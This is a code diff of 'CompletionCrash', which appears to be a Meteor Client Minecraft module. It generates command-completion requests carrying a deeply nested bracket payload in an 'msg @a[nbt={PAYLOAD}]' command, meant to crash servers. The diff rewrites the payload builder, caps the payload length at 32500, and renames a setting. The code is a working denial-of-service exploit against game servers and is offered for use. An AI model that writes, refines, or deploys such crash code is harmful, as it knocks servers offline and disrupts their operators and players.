@@ -8,11 +8,6 @@ import meteordevelopment.meteorclient.systems.modules.Module;
 import com.google.gson.JsonObject;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
-import net.minecraft.util.Hand;
-import net.minecraft.util.math.BlockPos;
-import net.minecraft.util.math.Direction;
 
 import java.util.concurrent.TimeUnit;
 import java.util.stream.Collectors;
@@ -32,7 +27,7 @@ public class CompletionCrash extends Module {
         .name("Length")
         .description("Command Length")
         .defaultValue(2005)
-        .sliderRange(500, 50000)
+        .sliderRange(500, 32500)
         .build());
 
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
@@ -42,8 +37,8 @@ public class CompletionCrash extends Module {
         .build());
 
     private final Setting<String> message = sgGeneral.add(new StringSetting.Builder()
-        .name("login-command")
-        .description("Command to login.")
+        .name("message")
+        .description("message")
         .defaultValue("msg @a[nbt={PAYLOAD}]")
         .build()
     );
@@ -100,12 +95,21 @@ public class CompletionCrash extends Module {
         if (autoDisable.get()) toggle();
     }
 
-    private String generateJsonObject(int levels) {
+    /*private String generateJsonObject(int levels) {
         String in = IntStream.range(0, levels)
             .mapToObj(i -> "[")
             .collect(Collectors.joining());
         String json = "{a:" + in + "}";
         return json;
+    }*/
+    private String generateJsonObject(int levels) {
+        StringBuilder builder = new StringBuilder("{a:");
+        for (int i = 0; i < levels; i++) {
+            builder.append("[");
+        }
+        builder.append("}");
+        return builder.toString();
     }
+
 }
 
